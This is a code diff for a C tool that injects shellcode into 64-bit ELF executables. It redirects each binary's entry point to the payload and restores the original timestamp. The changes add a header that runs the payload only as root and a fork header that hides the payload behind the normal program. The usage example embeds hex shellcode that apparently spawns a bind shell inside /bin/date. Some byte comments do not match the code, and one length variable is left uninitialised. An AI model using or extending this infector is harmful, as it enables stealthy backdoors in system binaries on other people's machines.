@@ -17,18 +17,36 @@
 #include <elf.h>
 
 // This header needs to be prepended to any payload.
+// It checks jumps back to the original entrypoint if the uid is not 0
+static unsigned char header_root[] = {
+	0x50,                    // push eax, Save eax for later
+	0x6a, 0x66,              // push 0x39, sys_fork
+	0x58,                    // pop eax
+	0x0f, 0x05,              // syscall
+	0x48, 0x83, 0xf8, 0x00,  // cmp    rax,0x0
+
+	0x58,                  // pop eax, from the first byte
+	0x74, 0x05,            // jmp ahead 5 bytes, length of parent section
+	// parent section 5 (^) bytes long
+	0xE9,                  // jump backwards to host code
+	0x00, 0x00, 0x00, 0x00 // placeholder for distance to proper entrypoint
+};
+
+// This header needs to be prepended to any payload.
 // It forks, then jumps back to the original entrypoint.
-static unsigned char header[] = {
+static unsigned char header_fork[] = {
 	0x50,       // push eax, Save eax for later
+	// Fork time
 	0x6a, 0x39, // push 0x39, sys_fork
 	0x58,       // pop eax
 	0x0f, 0x05, // syscall
 	0x48,       // dec eax
 	0x85, 0xc0, // test eax,eax, test if child or parent
-	0x74, 0x06, // jmp ahead 6 bytes, length of parent section
-	// parent section 6 (^) bytes long
-	0x58,       // pop eax, from the first byte
-	0xE9,       // jump backwards
+
+	0x58,                  // pop eax, from the first byte
+	0x74, 0x05,            // jmp ahead 5 bytes, length of parent section
+	// parent section 5 (^) bytes long
+	0xE9,                  // jump backwards to host code
 	0x00, 0x00, 0x00, 0x00 // placeholder for distance to proper entrypoint
 };
 
@@ -43,13 +61,15 @@ char *filename;
 
 static void showhelp(char * program){
 	printf("Usage: %s\n", program);
-	printf("  -f: Path to 64bit ELF binary to infect with the payload.\n");
+	printf("  -i: Path to 64bit ELF binary to infect with the payload.\n");
 	printf("  -p: Hex encoding of the payload.\n");
 	printf("  -v: Be verbose.\n");
 	printf("  -l: Only show how much room is available for a payload.\n");
+	printf("  -r: Include header to only execute payload when root.\n");
+	printf("  -f: Include header to fork process before running payload.\n");
 	printf("\n");
 	printf("Example:\n");
-	printf("%s -f /bin/date -p 6a2958996a025f6a015e0f05489752c \\\n", program);
+	printf("%s -i /bin/date -p 6a2958996a025f6a015e0f05489752c \\\n", program);
 	printf("704240200115c4889e66a105a6a31580f056a32580f054831f66a2b580f \\\n");
 	printf("0548976a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f73680 \\\n");
 	printf("0534889e752574889e60f05\n");
@@ -102,7 +122,7 @@ static void *mapfile(char const *filename, struct utimbuf *utimbuf)
  * for our payload program to fit into. The return value is negative if
  * an appropriate segment cannot be found.
  */
-static int findpayloadphdr(Elf64_Phdr const *phdr, int count)
+static int findpayloadphdr(Elf64_Phdr const *phdr, int count, long unsigned int headerlen)
 {
 	Elf64_Off pos, endpos;
 	int i, j;
@@ -110,7 +130,7 @@ static int findpayloadphdr(Elf64_Phdr const *phdr, int count)
 	unsigned long biggestroom = 0;
 
 	if (verbose > 0)
-		printf("Looking for a spot for %ld bytes of header and %ld bytes of payload\n", sizeof header, payloadlen);
+		printf("Looking for a spot for %ld bytes of header and %ld bytes of payload\n", headerlen, payloadlen);
 	for (i = 0 ; i < count ; ++i) {
 		endpos = phdr[i].p_offset + phdr[i].p_filesz;
 		room = 0;
@@ -126,19 +146,21 @@ static int findpayloadphdr(Elf64_Phdr const *phdr, int count)
 			biggestroom = room;
 		}
 		if (listsegments > 0)
-			 printf("Segment %2d start: %6ld size: %6ld end: %6ld room: %6ld executable: %-4s\n",
+			 printf("Segment %2d start: %7ld size: %7ld end: %7ld room: %7ld executable: %-4s\n",
 				i, phdr[i].p_offset, phdr[i].p_filesz, endpos, room, (phdr[i].p_flags & PF_X ? "yes!" : "no"));
 	}
-	if (verbose > 0 || listsegments > 0)
-		if (biggestroom > sizeof header)
-			printf("%s has room for %ld bytes of payload.\n", filename, biggestroom - sizeof header);
-		else
+	if (verbose > 0 || listsegments > 0) {
+		if (biggestroom > headerlen) {
+			printf("%s has room for %ld bytes of payload.\n", filename, biggestroom - headerlen);
+		} else {
 			printf("%s has no room for a payload.\n", filename);
+		}
+	}
 	for (i = 0 ; i < count ; ++i) {
 		if (phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz
 					 && (phdr[i].p_flags & PF_X)) {
 			pos = phdr[i].p_offset + phdr[i].p_filesz;
-			endpos = pos + sizeof header + payloadlen;
+			endpos = pos + headerlen + payloadlen;
 			for (j = 0 ; j < count ; ++j) {
 				if (phdr[j].p_offset >= pos && phdr[j].p_offset < endpos
 					&& phdr[j].p_filesz > 0)
@@ -165,8 +187,11 @@ int main(int argc, char *argv[])
 	char *image;
 	int n, opt;
 	filename = calloc (1, sizeof (char));
+	long unsigned int headerlen;
+	int include_fork = 0;
+	int include_root = 0;
 	// get user options
-	while ((opt = getopt(argc, argv, "hvlf:p:")) != -1) {
+	while ((opt = getopt(argc, argv, "hvlfri:p:")) != -1) {
 		switch (opt) {
 			case 'h': // TODO help
 				showhelp(argv[0]);
@@ -179,10 +204,18 @@ int main(int argc, char *argv[])
 				listsegments = 1;
 				skipinfection = 1;
 				break;
-			case 'f': // filename
+			case 'i': // filename
 				if (verbose > 0)
 					printf("Acting on %s\n", optarg);
 				strncpy(filename, optarg, strlen(optarg));
+				break;
+			case 'f': // fork header
+				headerlen += sizeof header_fork;
+				include_fork = 1;
+				break;
+			case 'r': //root header
+				headerlen += sizeof header_root;
+				include_root = 1;
 				break;
 			case 'p': // payload
 				// convert this to real bytes
@@ -233,7 +266,8 @@ int main(int argc, char *argv[])
 	/* Find a suitable location for our payload.
 	 */
 	phdr = (Elf64_Phdr*)(image + ehdr->e_phoff);
-	n = findpayloadphdr(phdr, ehdr->e_phnum);
+	unsigned char header[headerlen];
+	n = findpayloadphdr(phdr, ehdr->e_phnum, headerlen);
 	if (n < 0)
 	bail(filename, "unable to find a usable payload point");
 
@@ -248,8 +282,37 @@ int main(int argc, char *argv[])
 	/* Calculate the new entrypoint based on the number of bytes of
 	 * instructions up to the jump instruction.
 	 */
-	*(Elf64_Word*)(header + sizeof header - 4) =
-			(Elf64_Word)ehdr->e_entry - (pos + sizeof header);
+	if (verbose > 0)
+		printf("New entrypoint: %ld\n", pos);
+
+	long unsigned int headeroffset = 0;
+	if (include_root == 1) {
+		if (verbose > 0)
+			printf("Including root header bytes: %ld\n", sizeof header_root);
+
+		long int d = (Elf64_Word)ehdr->e_entry - (pos + headeroffset + sizeof header_root);
+		*(Elf64_Word*)(header_root + sizeof header_root - 4) = d;
+
+		printf("Jump target: %d\n", (Elf64_Word)ehdr->e_entry );
+		printf("Jump distance: %ld\n", d);
+
+		memcpy(&header[headeroffset], header_root, sizeof header_root);
+		headeroffset += sizeof header_root;
+	}
+	if (include_fork == 1) {
+		if (verbose > 0)
+			printf("Including fork header bytes: %ld\n", sizeof header_fork);
+
+
+		long int d = (Elf64_Word)ehdr->e_entry - (pos + headeroffset + sizeof header_fork);
+		*(Elf64_Word*)(header_fork + sizeof header_fork - 4) = d;
+
+		printf("Jump target: %d\n", (Elf64_Word)ehdr->e_entry);
+		printf("Jump distance: %ld\n", d);
+
+		memcpy(&header[headeroffset], header_fork, sizeof header_fork);
+		headeroffset += sizeof header_fork;
+	}
 	if (verbose > 0)
 		printf("entrypoint was at byte %ld\n", ehdr->e_entry);
 	ehdr->e_entry = pos;
@@ -260,10 +323,10 @@ int main(int argc, char *argv[])
 	 */
 	memcpy(image + phdr[n].p_offset + phdr[n].p_filesz,
 	   header, sizeof header);
-	memcpy(image + phdr[n].p_offset + phdr[n].p_filesz + sizeof header,
+	memcpy(image + phdr[n].p_offset + phdr[n].p_filesz + headerlen,
 	   payload, payloadlen);
-	phdr[n].p_filesz += sizeof header + payloadlen;
-	phdr[n].p_memsz += sizeof header + payloadlen;
+	phdr[n].p_filesz += headerlen + payloadlen;
+	phdr[n].p_memsz += headerlen + payloadlen;
 
 	/* Attempt to restore the file's original mtime. (This will fail
 	 * in most situations, but there's no harm in trying.)
